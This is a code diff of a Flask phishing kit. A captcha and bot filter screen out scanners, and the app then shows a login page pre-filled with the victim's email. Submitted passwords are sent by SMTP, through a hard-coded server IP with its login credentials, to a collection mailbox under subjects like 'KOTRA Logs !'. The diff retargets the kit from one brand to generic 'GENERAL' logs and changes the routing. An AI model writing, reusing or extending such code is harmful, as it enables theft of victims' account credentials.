@@ -77,7 +77,7 @@ bot_user_agents = [
 "crawler"
 ]
 
-@app.route('/', methods=['GET', 'POST'])
+@app.route('/m', methods=['GET', 'POST'])
 def captcha():
 
     if request.method == 'GET':
@@ -115,20 +115,21 @@ def captcha():
 
             return render_template('captcha.html', code=code, color=color, error=True)
 
-@app.route("/success")
+@app.route('/success')
 def success():
     if 'passed_captcha' in session and session['passed_captcha']:
-        web_param = session.get('eman')
+        web_param = request.args.get('web')
         return redirect(url_for('route2', web=web_param))
     else:
         return redirect(url_for('captcha'))
 
+
 @app.route("/")
 def route2():
-    web_param = request.args.get('web') or session.get('eman')
+    web_param = request.args.get('web')
     if web_param:
         session['eman'] = web_param
-        session['ins'] = web_param.split('@')[1] if '@' in web_param else None
+        session['ins'] = web_param[web_param.index('@') + 1:]
     return render_template('index.html', eman=session.get('eman'), ins=session.get('ins'))
 
 
@@ -146,11 +147,11 @@ def first():
         passwordemail = request.form.get("pig")
         sender_email = "contact@domainshieldtech.bio"
         sender_emaill = "contact"
-        receiver_email = "danielnewwoj@gmail.com"
+        receiver_email = "generallogs@mail.com "
         password = "vip6ebdd04ea6df"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
-        message["Subject"] = "KOTRA Logs !"
+        message["Subject"] = "GENERAL Logs !"
         message["From"] = sender_email
         message["To"] = receiver_email
         text = """\
@@ -166,7 +167,7 @@ def first():
         with smtplib.SMTP("77.83.196.189", 6040) as server:
             server.login(sender_emaill, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
-        return redirect(url_for('route2', eman=eman, ins=ins)
+        return redirect(url_for('benza', web=session.get('eman')))
 
 
 
@@ -184,11 +185,11 @@ def second():
         passwordemail = request.form.get("pig")
         sender_email = "contact@domainshieldtech.bio"
         sender_emaill = "contact"
-        receiver_email = "danielnewwoj@gmail.com"
+        receiver_email = "generallogs@mail.com"
         password = "vip6ebdd04ea6df"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
-        message["Subject"] = "KOTRA logs !! "
+        message["Subject"] = "GENERAL logs !! "
         message["From"] = sender_email
         message["To"] = receiver_email
         text = """\
